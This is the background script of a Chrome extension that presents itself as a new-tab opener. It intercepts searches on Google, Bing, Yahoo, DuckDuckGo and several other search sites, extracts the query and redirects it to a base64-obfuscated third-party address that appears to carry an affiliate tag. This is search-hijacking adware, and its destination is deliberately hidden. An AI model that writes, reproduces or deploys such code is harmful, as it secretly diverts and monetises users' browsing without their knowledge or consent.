chrome.browserAction.onClicked.addListener(function(activeTab) {
  chrome.tabs.create({});
});

chrome.runtime.onInstalled.addListener(function(details) {
  if (details.reason == "install") {
    chrome.tabs.create({});
  }
});

const searchParams = {
  urls: [    
    "*://searchresult.co/*",
    "*://str-search.com/*",
    "*://gl-search.com/*",
    "*://chrome-skins.com/*",
    "*://redirect.lovelytab.com/*",
    "*://www.mystart.com/*"
  ]
};

const rr = [
  { url: "://search.yahoo.com/search", searchQuerySymbol: "p" },
  { url: "://www.google.com/search", searchQuerySymbol: "q" },
  { url: "://www.bing.com/search", searchQuerySymbol: "q" },
  { url: "://duckduckgo.com/", searchQuerySymbol: "q" },
  { url: "://searchresult.co/", searchQuerySymbol: "q" },
  { url: "://redirect.lovelytab.com/", searchQuerySymbol: "q" },
  { url: "://gl-search.com/", searchQuerySymbol: "q" },
  { url: "://str-search.com/", searchQuerySymbol: "q" },
  { url: "://chrome-skins.com/", searchQuerySymbol: "q" },
  { url: "://www.mystart.com/", searchQuerySymbol: "q" }
];

initFrameListener();

function initFrameListener() {

  searchParams.urls.push(...searchPam);
  searchParams.urls.push(...searchYellow);
  searchParams.urls.push(...searchRed);
  searchParams.urls.push(...searchGreen);

  chrome.webRequest.onBeforeRequest.addListener(
    details => {
      if (details.type !== "main_frame") {
        return;
      }
      let query = "";
      const match = rr.some(x => {
        if (details.url.match(x.url)) {
          const originUrl = new URL(details.url);
          const params = new URLSearchParams(originUrl.search);
          query = params.getAll(x.searchQuerySymbol);
          return true;
        }
      });
      if (match && query) {
        return {
          redirectUrl: `${atob(
            "aHR0cDovL3d3dy5sb3ZlbHljaHJvbWV0YWIuY29tLz9hPWdzcF9uZXZhZGFfMDBfMDBfc3NnMTAmcT0="
          )}${query}`
        };
      }
    },
    searchParams,
    ["blocking"]
  );
  
  
}


